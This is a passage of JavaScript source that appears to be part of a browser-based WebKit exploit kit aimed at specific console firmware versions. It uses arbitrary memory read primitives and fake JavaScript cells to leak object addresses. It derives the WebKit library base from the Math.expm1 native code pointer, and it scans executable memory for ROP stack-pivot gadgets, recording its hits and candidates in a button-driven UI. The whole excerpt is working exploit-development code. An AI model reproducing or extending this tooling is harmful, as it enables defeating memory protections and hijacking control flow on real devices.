    if (!guardG5Rva(rva, "peek")) return;
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("G5-SKIP", "no webkitBase");
        return;
    }
    const addr = webkitBase.add32(rva);
    if (addrIn) addrIn.value = String(addr).replace(/^0x/i, "");
    peekAt(addr);
}

function wireG5Bar() {
    const host = $("gadget-g5");
    if (!host) return;
    const g0 = PIVOT_HW_1352.wk_MOV_RDI_RSI_30_CALL;

    function addBtn(label, fn, alwaysOn) {
        const b = document.createElement("button");
        b.type = "button";
        b.className = "secondary";
        b.textContent = label;
        b.disabled = !alwaysOn;
        wireClick(b, fn);
        host.appendChild(b);
        if (!alwaysOn) g5BarBtns.push(b);
        return b;
    }

    addBtn("G5 hunt low", function () { runG5HuntNear(); });
    addBtn("G5 hunt expm1", function () { runG5HuntExpm1(); });
    addBtn("Probe G0-G4 expm1", function () { tryPivotExpm1Probe(null); });
    addBtn("Try G0 expm1", function () {
        const off = loadEffectiveOff();
        const hint = pivotExpm1HintFor("wk_MOV_RDI_RSI_30_CALL", off)
            || pivotG0FromG5(off.wk_PUSH_RDX_POP_RSP_RET);
        if (!hint) { mark("EXPM1-SKIP", "no G0 hint"); return; }
        if (!ready || !window.p) return;
        const { webkitBase } = basesFromSession(off);
        const exec = pivotExecPattern("G0", off);
        const ok = exec && checkPivotBytes(a => read1p(window.p, a), webkitBase, hint, exec);
        mark(ok ? "GADGET-OK" : "GADGET-BAD", "G0 expm1 +0x" + hint.toString(16)
            + " " + gadgetBytesHex(window.p, webkitBase, hint, Math.max(exec.length, 12)));
        if (ok) {
            savePivotFullOverride(webkitBase, { wk_MOV_RDI_RSI_30_CALL: hint });
            verifyPivotManual();
        }
    });
    addBtn("G5 scan upper", function () { runG5UpperScan(); });
    addBtn("G5 all-in", function () { runG5FullHunt(); });
    addBtn("Probe bound", function () { probeWebkitBound(); });
    addBtn("Try G5 13.00", function () { tryLegacyG5(0x2abccaa, "13.00"); });
    addBtn("G5 probe", function () {
        scanG5Full = true;
        runG5ClusterProbe();
    });

    const clearHost = host;
    const clearBtn = document.createElement("button");
    clearBtn.type = "button";
    clearBtn.className = "secondary";
    clearBtn.id = "btn-clear-pivot";
    clearBtn.textContent = "Clear pivot";
    clearBtn.disabled = false;
    wireClick(clearBtn, function () { clearPivotState(); });
    clearHost.appendChild(clearBtn);

    const restoreBtn = document.createElement("button");
    restoreBtn.type = "button";
    restoreBtn.className = "secondary";
    restoreBtn.id = "btn-restore-pivot";
    restoreBtn.textContent = "Restore HW pivot";
    restoreBtn.disabled = false;
    wireClick(restoreBtn, function () { restoreHwPivot(); });
    clearHost.appendChild(restoreBtn);

    const hint = host.querySelector(".bar-label");
    if (hint)
        hint.textContent = "G5 @ expm1+0x53642a | G0 @ expm1+0x3d90c8 or G5-0x15d362 — Probe expm1 before low prefix scan";
}

function wireGadgetBars() {
    const groups = { base: $("gadget-base"), pop: $("gadget-pop"), pivot: $("gadget-pivot") };
    for (let i = 0; i < MANUAL_TESTS.length; i++) {
        const t = MANUAL_TESTS[i];
        const host = groups[t.group];
        if (!host) continue;
        const b = document.createElement("button");
        b.type = "button";
        b.className = "secondary";
        b.textContent = t.label;
        b.disabled = true;
        const id = t.id;
        wireClick(b, function () { runManualTest(id); });
        host.appendChild(b);
        gadgetBtns.push(b);
    }
}

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function same64(a, b) {
    return a && b && a.low === b.low && a.hi === b.hi;
}

function addPtr(label, addr, note) {
    if (!addr) return;
    const row = { label, addr: String(addr), note: note || "" };
    pointers.push(row);
    mark("ADDR", row.label + "  " + row.addr + (row.note ? "  (" + row.note + ")" : ""));
}

function walkCell(p, label, obj) {
    retained.push(obj);
    const cell = p.leakval(obj);
    addPtr(label + " cell", cell, "leakval");
    const hdr = read8p(p, cell);
    if (hdr) mark("HDR", label + " header=" + hdr);
    for (const [off, tag] of [[0x8, "butterfly"], [0x10, "+0x10"], [0x18, "+0x18"]]) {
        const q = read8p(p, cell.add32(off));
        if (q && q.low !== 0) addPtr(label + " " + tag, q, "cell+0x" + off.toString(16));
    }
    return cell;
}

function captureNativeChain(p, mFunctionOff, off) {
    const cell = walkCell(p, "Math.expm1", Math.expm1);
    const mid = read8p(p, cell.add32(0x18));
    if (!mid) return null;
    addPtr("JSFunction (expm1)", mid, "cell+0x18");
    const nativeFn = read8p(p, mid.add32(mFunctionOff));
    if (nativeFn) {
        addPtr("native code ptr", nativeFn, "m_function / webkit .text");
        try { sessionStorage.setItem("wk-nativeFn", String(nativeFn)); } catch (_) { }
        const q0 = read4p(p, nativeFn);
        if (q0 != null) mark("CODE", "nativeFn first4=0x" + (q0 >>> 0).toString(16));
        if (off && off.wk_expm1_builtin) {
            const n = (nativeFn.hi * 0x100000000 + (nativeFn.low >>> 0))
                - (off.wk_expm1_builtin >>> 0);
            const webkitBase = new int64(n >>> 0, Math.floor(n / 0x100000000));
            addPtr("webkitBase (assumed)", webkitBase,
                "nativeFn - 0x" + off.wk_expm1_builtin.toString(16));
            persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
        }
    }
    return nativeFn;
}

function addPairStatusPtrs() {
    const ps = pairStatus;
    const fields = [
        ["mainAddress", "carrier mainView"],
        ["mainVector", "main vector"],
        ["mainCellFromFakeSlot", "main from fake slot"],
        ["workerAddress", "carrier workerView"],
        ["workerVector", "worker vector"],
        ["workerButterfly", "worker butterfly"],
        ["fakeAddress", "fake cell"],
        ["fakeButterfly", "fake butterfly"],
    ];
    for (const [key, label] of fields) {
        const v = ps[key];
        if (v != null && v !== -1) addPtr(label, v, "pair/exploit");
    }
    mark("PAIR", "state=" + ps.state + " promoted=" + ps.promoted
        + " vectorOff=0x" + (ps.vectorOffset >>> 0).toString(16));
}

function renderMap() {
    if (!mapBody) return;
    if (pointers.length === 0) {
        mapBody.innerHTML = "<tr><td colspan=\"3\">no pointers</td></tr>";
        return;
    }
    mapBody.innerHTML = pointers.map((row, i) =>
        "<tr><td>" + row.label + "</td>"
        + "<td class=\"addr\" data-i=\"" + i + "\">" + row.addr + "</td>"
        + "<td>" + row.note + "</td></tr>"
    ).join("");
    mapBody.querySelectorAll(".addr").forEach(el => {
        el.addEventListener("click", () => {
            const row = pointers[+el.getAttribute("data-i")];
            if (row && addrIn) addrIn.value = row.addr.replace(/^0x/i, "");
            peekAt(parseAddr(row.addr.replace(/^0x/i, "")));
        });
    });

    if (pickPtr) {
        const cur = pickPtr.value;
        pickPtr.innerHTML = "<option value=\"\">pick known ptr…</option>"
            + pointers.map((row, i) =>
                "<option value=\"" + i + "\">" + row.label + " " + row.addr + "</option>"
            ).join("");
        if (cur) pickPtr.value = cur;
    }
}

function hexLine(addr, bytes) {
    const a = addr.low.toString(16).padStart(8, "0");
    const h = [...bytes].map(b => b.toString(16).padStart(2, "0")).join(" ");
    return a + "  " + h;
}

function read1p(p, addr) {
    try { return p.read1(addr); } catch (_) { return null; }
}

function peekAt(addr) {
    const p = window.p;
    if (!p || !addr) {
        if (hexEl) hexEl.textContent = "bad address";
        return;
    }
    const out = [];
    let cur = addr;
    for (let row = 0; row < 8; row++) {
        const chunk = [];
        for (let i = 0; i < 8; i++) {
            const b = read1p(p, cur.add32(i));
            if (b == null) {
                if (hexEl) hexEl.textContent = out.join("\n") + "\n(read failed @ " + cur + ")";
                return;
            }
            chunk.push(b & 0xff);
        }
        out.push(hexLine(cur, chunk));
        cur = cur.add32(8);
    }
    if (hexEl) hexEl.textContent = out.join("\n");
    mark("PEEK", String(addr));
}

function loadEffectiveOff() {
    const detected = offsetsFor(navigator.userAgent);
    const key = detected.key || "13.52";
    let off = Object.assign({}, offsetsForKey(key).off || {});
    try {
        const cal = sessionStorage.getItem("wk-calibrated");
        if (cal) off = Object.assign(off, JSON.parse(cal));
    } catch (_) { }
    off = Object.assign(off, HW_GADGETS_1352, PIVOT_HW_1352);
    const scanned = loadScannedPivot();
    if (scanned) off = mergeScannedPivot(off, scanned);
    const wb = chainWebkitBase(off);
    off = mergePivotFullOff(off, wb);
    if (off.pivot_view_sp == null)
        off.pivot_view_sp = PIVOT_HINTS_1300.pivot_view_sp;
    return off;
}

function pivotClusterRange(found) {
    const cap = scanCapOff();
    const known = [];
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        const k = PIVOT_ROWS[i][1];
        const r = (found && found[k] != null) ? found[k] : PIVOT_HW_1352[k];
        if (r != null) known.push(r);
    }
    if (!known.length) return null;
    let lo = known[0];
    let hi = known[0];
    for (let i = 1; i < known.length; i++) {
        if (known[i] < lo) lo = known[i];
        if (known[i] > hi) hi = known[i];
    }
    return {
        minRva: Math.max(SCAN_PIVOT_MIN, lo - SCAN_CLUSTER_PAD),
        maxRva: Math.min(cap, hi + SCAN_CLUSTER_PAD),
    };
}

function pivotScanRange(key, phase, found) {
    const off = loadEffectiveOff();
    const cap = webkitRvaMax(off);
    if (phase === "upper") {
        const lo = SCAN_LOW_MAX;
        if (lo >= cap) return null;
        return { minRva: lo, maxRva: cap };
    }
    if (phase === "nearg5") {
        const center = G5_HUNT_CENTER || pivotScanHint(key, found, cap, off);
        if (center <= 0 || center >= cap) return null;
        return {
            minRva: Math.max(SCAN_PIVOT_MIN, center - G5_HUNT_RADIUS),
            maxRva: Math.min(cap, center + G5_HUNT_RADIUS),
        };
    }
    if (phase === "cluster") {
        return pivotClusterRange(found);
    }
    if (phase === "low") {
        return { minRva: SCAN_PIVOT_MIN, maxRva: Math.min(SCAN_LOW_MAX, cap) };
    }
    const hint = pivotHint(key);
    if (hint <= 0 || hint >= cap) return null;
    return {
        minRva: Math.max(SCAN_PIVOT_MIN, hint - SCAN_NEAR_RADIUS),
        maxRva: Math.min(cap, hint + SCAN_NEAR_RADIUS),
    };
}

function pivotScanPatterns(label, pat) {
    if (label === "G5") return G5_PATTERNS.map(g => g.pat);
    return [pat];
}

function pivotStartPhase(label) {
    return label === "G5" ? "nearg5" : "low";
}

function pivotScanFoundInit() {
    const found = Object.assign({}, PIVOT_HW_1352);
    const full = loadPivotFullOverride();
    if (full) Object.assign(found, full);
    const saved = loadScannedPivot();
    if (saved && saved.wk_PUSH_RDX_POP_RSP_RET != null)
        found.wk_PUSH_RDX_POP_RSP_RET = saved.wk_PUSH_RDX_POP_RSP_RET;
    return found;
}

function bytesFromRead8Into(w, out, at) {
    at = at || 0;
    let v = w.low >>> 0;
    for (let i = 0; i < 4; i++) {
        out[at + i] = v & 0xff;
        v >>>= 8;
    }
    v = w.hi >>> 0;
    for (let i = 4; i < 8; i++) {
        out[at + i] = v & 0xff;
        v >>>= 8;
    }
}

function fillWindow16(p, base, rva, buf) {
    const w0 = read8p(p, base.add32(rva));
    if (!w0) return false;
    bytesFromRead8Into(w0, buf, 0);
    const w1 = read8p(p, base.add32(rva + 8));
    if (w1) bytesFromRead8Into(w1, buf, 8);
    else for (let i = 8; i < 16; i++) buf[i] = 0;
    return true;
}

function bytesFromRead8(w) {
    bytesFromRead8Into(w, _scanBytes);
    return _scanBytes;
}

function matchPatAt(bytes, startOff, pat) {
    for (let i = 0; i < pat.length; i++) {
        if (pat[i] === null) continue;
        if ((bytes[startOff + i] & 0xff) !== pat[i]) return false;
    }
    return true;
}

function findPatInQword(bytes, pat) {
    const maxStart = 8 - pat.length;
    for (let start = 0; start <= maxStart; start++) {
        if (matchPatAt(bytes, start, pat)) return start;
    }
    return -1;
}

function scanState(msg) {
    if (stateEl) {
        stateEl.textContent = msg;
        stateEl.className = "warn";
    }
}

function g5CandPush(cands, entry, hint) {
    if (cands.length < SCAN_G5_CAND_MAX) {
        cands.push(entry);
        return;
    }
    let worst = 0;
    let worstDist = hint > 0
        ? Math.abs(cands[0].rva - hint)
        : -cands[0].rva;
    for (let i = 1; i < cands.length; i++) {
        const d = hint > 0
            ? Math.abs(cands[i].rva - hint)
            : -cands[i].rva;
        if (d > worstDist) {
            worst = i;
            worstDist = d;
        }
    }
    const nd = hint > 0
        ? Math.abs(entry.rva - hint)
        : -entry.rva;
    if (nd < worstDist) cands[worst] = entry;
}

function logG5Cands(cands) {
    if (!cands.length) return;
    const sorted = cands.slice().sort((a, b) => a.rva - b.rva);
    const show = Math.min(sorted.length, 8);
    for (let i = 0; i < show; i++)
        mark("G5-CAND", "+0x" + sorted[i].rva.toString(16)
            + (sorted[i].kind ? " " + sorted[i].kind : ""));
    if (sorted.length > show)
        mark("G5-CAND", "… +" + (sorted.length - show) + " more");
}

function pivotRowByKey(key) {
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        if (PIVOT_ROWS[i][1] === key) return PIVOT_ROWS[i];
    }
    return null;
}

/** True when gadget at effective RVA passes prefix-byte check (HW scan method). */
function pivotRowPrefixOk(p, webkitBase, off, row) {
    if (!p || !webkitBase || !row) return false;
    const label = row[0];
    const key = row[1];
    const rva = off[key];
    if (rva == null) return false;
    const read1 = a => read1p(p, a);
    if (label === "G5") return !!checkG5Bytes(read1, webkitBase, rva);
    const pat = pivotPattern(row, off);
    return checkPivotBytes(read1, webkitBase, rva, pat);
}

/** True when gadget at effective RVA passes full execution-byte check. */
function pivotRowVerifyOk(p, webkitBase, off, row) {
    if (!p || !webkitBase || !row) return false;
    const label = row[0];
    const key = row[1];
    const rva = off[key];
    if (rva == null) return false;
    const read1 = a => read1p(p, a);
    if (label === "G5") return !!checkG5Bytes(read1, webkitBase, rva);
    const pat = pivotVerifyPattern(row, off);
    return checkPivotBytes(read1, webkitBase, rva, pat);
}

function pivotRowsNeedingPrefixScan(p, webkitBase, off) {
    const out = [];
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        const row = PIVOT_ROWS[i];
        if (row[0] === "MOV_RDI_RAX") continue;
        if (pivotRowPrefixOk(p, webkitBase, off, row)) continue;
        out.push(row);
    }
    return out;
}

/** True when effective RVA matches full poops execution bytes (G0-G4). */
function pivotRowFullExecOk(p, webkitBase, off, row) {
    if (!p || !webkitBase || !row) return false;
    const label = row[0];
    const key = row[1];
    const rva = off[key];
    if (rva == null) return false;
    const exec = pivotExecPattern(label, off);
    if (!exec) return false;
    return checkPivotBytes(a => read1p(p, a), webkitBase, rva, exec);
}

function pivotRowsNeedingFullExecScan(p, webkitBase, off) {
    const out = [];
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        const row = PIVOT_ROWS[i];
        const label = row[0];
        if (label === "MOV_RDI_RAX" || label === "G5") continue;
        if (pivotRowFullExecOk(p, webkitBase, off, row)) continue;
        out.push(row);
    }
    return out;
}

function pivotRowDone(found, key, p, webkitBase, off) {
    const row = pivotRowByKey(key);
    if (!row) return found[key] != null;
    const rva = found[key] != null ? found[key] : (off && off[key]);
    if (rva == null) return false;
    const offTry = Object.assign({}, off, { [key]: rva });
    return pivotRowPrefixOk(p, webkitBase, offTry, row);
}

function advancePivotRowIdx(pivotScan, p, webkitBase, off) {
    while (pivotScan.rowIdx < PIVOT_ROWS.length) {
        const key = PIVOT_ROWS[pivotScan.rowIdx][1];
        if (!pivotRowDone(pivotScan.found, key, p, webkitBase, off)) return false;
        pivotScan.rowIdx++;
        pivotScan.cursor = null;
        pivotScan.phase = pivotStartPhase(PIVOT_ROWS[pivotScan.rowIdx]
            ? PIVOT_ROWS[pivotScan.rowIdx][0] : "G0");
    }
    return true;
}

function loadPivotScanState(base) {
    try {
        const raw = sessionStorage.getItem("wk-pivot-scan-state");
        if (!raw) return null;
        const st = JSON.parse(raw);
        if (!st || String(st.base) !== String(base)) return null;
        return st;
    } catch (_) {
        return null;
    }
}

function preparePivotScan(webkitBase, p) {
    const off = loadEffectiveOff();
    const found = pivotScanFoundInit();
    let rowIdx = PIVOT_ROWS.length;
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        const row = PIVOT_ROWS[i];
        if (row[0] === "MOV_RDI_RAX") continue;
        if (!pivotRowPrefixOk(p, webkitBase, off, row)) {
            rowIdx = i;
            break;
        }
    }
    const prev = loadPivotScanState(webkitBase);
    const rowLabel = rowIdx < PIVOT_ROWS.length ? PIVOT_ROWS[rowIdx][0] : "";
    const startPhase = pivotStartPhase(rowLabel);
    pivotScan = {
        base: String(webkitBase),
        rowIdx,
        cursor: (prev && prev.rowIdx === rowIdx && prev.phase === startPhase) ? prev.cursor : null,
        phase: (prev && prev.rowIdx === rowIdx) ? (prev.phase || startPhase) : startPhase,
        found,
        bestHit: (prev && prev.rowIdx === rowIdx) ? (prev.bestHit || null) : null,
        g5Cands: (prev && prev.rowIdx === rowIdx && prev.g5Cands) ? prev.g5Cands : [],
    };
    if (rowIdx < PIVOT_ROWS.length) {
        mark("SCAN-START", "scanning " + PIVOT_ROWS[rowIdx][0]
            + " (" + (rowIdx + 1) + "/" + PIVOT_ROWS.length + ")");
    }
    savePivotScanState(pivotScan);
}

function savePivotScanState(st) {
    if (!st) return;
    try {
        sessionStorage.setItem("wk-pivot-scan-state", JSON.stringify({
            base: st.base,
            rowIdx: st.rowIdx,
            cursor: st.cursor,
            phase: st.phase,
            found: st.found,
            bestHit: st.bestHit || null,
            g5Cands: st.g5Cands || [],
        }));
    } catch (_) { }
}

/** One bounded chunk per call — cal scanGadgetChunk style. */
async function scanPivotRowPhase(p, webkitBase, off) {
    if (!pivotScan || String(pivotScan.base) !== String(webkitBase))
        preparePivotScan(webkitBase, p);
    pivotScan.found = Object.assign(pivotScanFoundInit(), pivotScan.found);
    if (pivotScan.bestHit == null) pivotScan.bestHit = null;
    if (!pivotScan.g5Cands) pivotScan.g5Cands = [];

    if (pivotScan.rowIdx >= PIVOT_ROWS.length
        || advancePivotRowIdx(pivotScan, p, webkitBase, off)) {
        mark("SCAN-DONE", "all pivot rows processed");
        savePivotScanState(pivotScan);
        return "done";
    }

    const row = PIVOT_ROWS[pivotScan.rowIdx];
    const key = row[1];
    const label = row[0];
    const offScan = loadEffectiveOff();
    const pat = pivotPattern(row, offScan);
    const pats = pivotScanPatterns(label, pat);
    const patKinds = label === "G5" ? G5_PATTERNS.map(g => g.kind) : null;
    if (!pivotScan.phase) pivotScan.phase = pivotStartPhase(label);
    const range = pivotScanRange(key, pivotScan.phase, pivotScan.found);
    if (!range) {
        if (label === "G5" && pivotScan.phase === "cluster") {
            mark("G5-PHASE", "no cluster — use G5 bar or full scan");
            pivotScan.rowIdx++;
            pivotScan.cursor = null;
            pivotScan.phase = "cluster";
            pivotScan.bestHit = null;
            pivotScan.g5Cands = [];
            savePivotScanState(pivotScan);
            return "continue";
        }
        if (pivotScan.phase === "cluster") {
            pivotScan.phase = "low";
            pivotScan.cursor = null;
            pivotScan.bestHit = null;
            savePivotScanState(pivotScan);
            mark("SCAN-PHASE", label + " — cluster skip, low .text");
            return "continue";
        }
        mark("SCAN-MISS", label + " — no scan range");
        pivotScan.rowIdx++;
        pivotScan.cursor = null;
        pivotScan.phase = pivotStartPhase(
            PIVOT_ROWS[pivotScan.rowIdx] ? PIVOT_ROWS[pivotScan.rowIdx][0] : "G0");
        pivotScan.bestHit = null;
        pivotScan.g5Cands = [];
        savePivotScanState(pivotScan);
        return "continue";
    }

    let rva = pivotScan.cursor != null ? pivotScan.cursor : (range.minRva & ~7);
    let steps = 0;
    const hint = pivotScanHint(key, pivotScan.found, scanCapOff(), loadEffectiveOff());
    const chunkMax = SCAN_CHUNK_STEPS > 0 ? SCAN_CHUNK_STEPS : 2048;

    while (rva < range.maxRva && !scanPivotStop && steps < chunkMax) {
        if (label === "G5") {
            scanG5PatternsAt(p, webkitBase, rva, pivotScan.g5Cands, hint || G5_HUNT_CENTER);
            const best = pickBestG5Cand(pivotScan.g5Cands, hint || G5_HUNT_CENTER);
            if (best) pivotScan.bestHit = best;
        } else {
            const w = read8p(p, webkitBase.add32(rva));
            if (w) {
                const bytes = bytesFromRead8(w);
                for (let pi = 0; pi < pats.length; pi++) {
                    const offIn = findPatInQword(bytes, pats[pi]);
                    if (offIn < 0) continue;
                    const cand = rva + offIn;
                    if (pivotScan.bestHit == null)
                        pivotScan.bestHit = { rva: cand };
                    else if (hint > 0
                        && Math.abs(cand - hint) < Math.abs(pivotScan.bestHit.rva - hint))
                        pivotScan.bestHit = { rva: cand };
                }
            }
        }
        rva += 8;
        steps++;
        if (SCAN_YIELD_EVERY > 0 && (steps & (SCAN_YIELD_EVERY - 1)) === 0)
            await new Promise(r => setTimeout(r, 0));
    }

    pivotScan.cursor = rva;
    scanState("scan " + label + " " + pivotScan.phase + " @+0x" + rva.toString(16));

    if (scanPivotStop) {
        savePivotScanState(pivotScan);
        return "stopped";
    }

    if (rva < range.maxRva) {
        savePivotScanState(pivotScan);
        return "continue";
    }

    const hit = pivotScan.bestHit;
    pivotScan.cursor = null;
    savePivotScanState(pivotScan);

    if (hit != null) {
        pivotScan.found[key] = hit.rva;
        if (label === "G5")
            saveScannedPivot(webkitBase, pivotScan.found);
        else
            savePivotFullOverride(webkitBase, { [key]: hit.rva });
        if (label === "G5") {
            logG5Cands(pivotScan.g5Cands);
            mark("SCAN-HIT", "G5 +0x" + hit.rva.toString(16)
                + (hit.kind ? " " + hit.kind : "")
                + " phase=" + pivotScan.phase);
        } else {
            mark("SCAN-HIT", label + " +0x" + hit.rva.toString(16)
                + " phase=" + pivotScan.phase
                + (hint ? " hint=+0x" + hint.toString(16) : "")
                + " bytes=" + gadgetBytesHex(p, webkitBase, hit.rva, 16));
        }
        pivotScan.rowIdx++;
        pivotScan.phase = pivotStartPhase(
            PIVOT_ROWS[pivotScan.rowIdx] ? PIVOT_ROWS[pivotScan.rowIdx][0] : "G0");
        pivotScan.bestHit = null;
        pivotScan.g5Cands = [];
        savePivotScanState(pivotScan);
        updatePivotReady(p, loadEffectiveOff());
        return "continue";
    }

    if (label === "G5" && pivotScan.phase === "nearg5") {
        pivotScan.phase = "cluster";
        pivotScan.cursor = null;
        pivotScan.bestHit = null;
        savePivotScanState(pivotScan);
        mark("G5-PHASE", "near-G0 (+0x2411ac) miss — trying G0-G4 cluster");
        return "continue";
    }

    if (label === "G5" && pivotScan.phase === "cluster") {
        pivotScan.phase = "low";
        pivotScan.cursor = null;
        pivotScan.bestHit = null;
        savePivotScanState(pivotScan);
        mark("G5-PHASE", "cluster miss — low .text (16-byte scan)");
        return "continue";
    }

    if (label === "G5" && pivotScan.phase === "low") {
        pivotScan.phase = "upper";
        pivotScan.cursor = null;
        pivotScan.bestHit = null;
        pivotScan.g5Cands = [];
        savePivotScanState(pivotScan);
        const cap = scanCapOff();
        mark("G5-PHASE", "low miss — upper .text +0x" + SCAN_LOW_MAX.toString(16)
            + "…+0x" + cap.toString(16) + " (13.00 high G5 unmapped)");
        return "continue";
    }

    if (label === "G5" && pivotScan.phase === "upper") {
        logG5Cands(pivotScan.g5Cands);
        mark("SCAN-MISS", "G5 not found — try G5 hunt expm1 or G5 all-in");
        pivotScan.rowIdx++;
        pivotScan.phase = "nearg5";
        pivotScan.bestHit = null;
        pivotScan.g5Cands = [];
        savePivotScanState(pivotScan);
        return "continue";
    }

    if (pivotScan.phase === "cluster") {
        pivotScan.phase = "low";
        pivotScan.cursor = null;
        pivotScan.bestHit = null;
        savePivotScanState(pivotScan);
        mark("SCAN-PHASE", label + " cluster miss — low .text");
        return "continue";
    }

    mark("SCAN-MISS", label + " not found — paste RVA if you find on HW");
    pivotScan.rowIdx++;
    pivotScan.phase = pivotStartPhase(
        PIVOT_ROWS[pivotScan.rowIdx] ? PIVOT_ROWS[pivotScan.rowIdx][0] : "G0");
    pivotScan.bestHit = null;
    pivotScan.g5Cands = [];
    savePivotScanState(pivotScan);
    return "continue";
}

function stopPivotScanQuiet() {
    scanPivotStop = true;
    scanPivotAuto = false;
}

function runG5ClusterProbe() {
    if (!ready || !window.p || busy) return;
    if (scanPivotAuto) {
        scanPivotStop = true;
        mark("SCAN-STOP", "stopping…");
        return;
    }
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("G5-SKIP", "no webkitBase");
        return;
    }
    preparePivotScan(webkitBase, p);
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        if (PIVOT_ROWS[i][0] === "G5") {
            pivotScan.rowIdx = i;
            break;
        }
    }
    pivotScan.phase = "nearg5";
    pivotScan.cursor = null;
    pivotScan.bestHit = null;
    pivotScan.g5Cands = [];
    savePivotScanState(pivotScan);
    mark("G5-PROBE", "near-G0 @+0x2411ac (G0+0x15d362, chunked)");
    runPivotScanLoop(true);
}

async function runPivotScanLoop(g5Only) {
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) return;

    scanPivotAuto = true;
    scanPivotStop = false;
    scanQuiet = true;
    busy = true;
    setUi();

    try {
        while (scanPivotAuto && !scanPivotStop) {
            const st = await scanPivotRowPhase(p, webkitBase, off);
            if (st === "stopped") break;
            if (g5Only) {
                if (pivotScan.found.wk_PUSH_RDX_POP_RSP_RET != null) break;
                if (pivotScan.rowIdx > 6) break;
            } else if (st === "done") {
                break;
            }
        }
        if (scanPivotStop)
            mark("SCAN-STOP", "cancelled");
        else if (!g5Only)
            verifyPivotManual(true);
        else if (pivotScan.found.wk_PUSH_RDX_POP_RSP_RET != null)
            mark("G5-PICK", "+0x" + pivotScan.found.wk_PUSH_RDX_POP_RSP_RET.toString(16)
                + " — tap Verify pivot");
    } catch (err) {
        mark("SCAN-FAIL", err.message || String(err));
        state("scan error", "bad");
    } finally {
        scanQuiet = false;
        scanRenderPending = 0;
        scanPivotAuto = false;
        scanPivotStop = false;
        busy = false;
        renderOut();
        setUi();
    }
}

async function runPivotScanAuto() {
    if (!ready || !window.p) return;
    if (scanPivotAuto) {
        scanPivotStop = true;
        mark("SCAN-STOP", "stopping after current chunk…");
        return;
    }

    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("SCAN-SKIP", "no webkitBase — Save bases first");
        return;
    }

    preparePivotScan(webkitBase, p);
    const needs = pivotRowsNeedingPrefixScan(p, webkitBase, off);
    if (needs.length === 0) {
        mark("SCAN-SKIP", "all pivot gadgets verify — tap Verify pivot");
        verifyPivotManual();
        return;
    }
    state("scanning " + needs.map(r => r[0]).join(", ") + "…", "warn");
    mark("SCAN-AUTO", "prefix scan: " + needs.map(r => r[0]).join(", ")
        + " — chunked " + SCAN_CHUNK_STEPS + " steps/tick — tap Stop to cancel");

    await runPivotScanLoop(false);
}

async function scanPivotChunk() {
    return runPivotScanAuto();
}

function pivotFullScanRange(label, key, off, tableHint) {
    const cap = scanCapOff();
    const center = pivotProbeHint(key, off, off) || tableHint;
    if (center > SCAN_LOW_MAX) {
        return {
            minRva: Math.max(SCAN_LOW_MAX, center - SCAN_NEAR_RADIUS),
            maxRva: Math.min(cap, center + SCAN_NEAR_RADIUS),
            center,
            phase: "expm1",
        };
    }
    if (center > 0) {
        return {
            minRva: Math.max(SCAN_PIVOT_MIN, center - SCAN_NEAR_RADIUS),
            maxRva: Math.min(SCAN_LOW_MAX, cap, center + SCAN_NEAR_RADIUS),
            center,
            phase: "near",
        };
    }
    return {
        minRva: SCAN_PIVOT_MIN,
        maxRva: Math.min(SCAN_LOW_MAX, cap),
        center: 0,
        phase: "low",
    };
}

/** G5-style: read full poops bytes @ expm1+delta (and G0 @ G5−0x15d362) — no scan. */
function probePivotExpm1Hints(p, webkitBase, off) {
    const hits = {};
    const read1 = a => read1p(p, a);
    const g5rva = off.wk_PUSH_RDX_POP_RSP_RET;

    if (g5rva != null) {
        const g0hint = pivotG0FromG5(g5rva);
        if (g0hint > 0x10000 && g5RvaSafe(g0hint, off)) {
            const exec = pivotExecPattern("G0", off);
            if (exec && checkPivotBytes(read1, webkitBase, g0hint, exec)) {
                hits.wk_MOV_RDI_RSI_30_CALL = g0hint;
                mark("EXPM1-HIT", "G0 +0x" + g0hint.toString(16)
                    + " (G5-0x15d362) full poops OK");
            } else if (exec) {
                mark("EXPM1-TRY", "G0 +0x" + g0hint.toString(16) + " (G5-Δ) got "
                    + gadgetBytesHex(p, webkitBase, g0hint, Math.max(exec.length, 12)));
            }
        }
    }

    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        const row = PIVOT_ROWS[i];
        const label = row[0];
        const key = row[1];
        if (label === "MOV_RDI_RAX" || label === "G5") continue;
        if (hits[key] != null) continue;
        const hint = pivotExpm1HintFor(key, off);
        if (!hint || !g5RvaSafe(hint, off)) continue;
        const exec = pivotExecPattern(label, off);
        if (!exec) continue;
        if (checkPivotBytes(read1, webkitBase, hint, exec)) {
            hits[key] = hint;
            mark("EXPM1-HIT", label + " +0x" + hint.toString(16)
                + " (expm1+delta) full poops OK");
        } else {
            mark("EXPM1-TRY", label + " +0x" + hint.toString(16) + " got "
                + gadgetBytesHex(p, webkitBase, hint, Math.max(exec.length, 12)));
        }
    }

    if (Object.keys(hits).length) {
        savePivotFullOverride(webkitBase, hits);
        mark("EXPM1-SAVE", Object.keys(hits).join(", "));
    }
    return hits;
}

function tryPivotExpm1Probe(label) {
    if (!ready || !window.p) {
        mark("EXPM1-SKIP", "need Start + Save bases");
        return;
    }
    const p = window.p;
    const off = loadEffectiveOff();
    const webkitBase = chainWebkitBase(off);
    if (!webkitBase) {
        mark("EXPM1-SKIP", "no webkitBase");
        return;
    }
    mark("EXPM1-PROBE", "G5-style expm1 hints"
        + (label ? " (" + label + ")" : " G0-G4"));
    probePivotExpm1Hints(p, webkitBase, off);
    verifyPivotManual(true);
}

function preparePivotFullScan(webkitBase, p) {
    const off = loadEffectiveOff();
    let rowIdx = PIVOT_ROWS.length;
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        const row = PIVOT_ROWS[i];
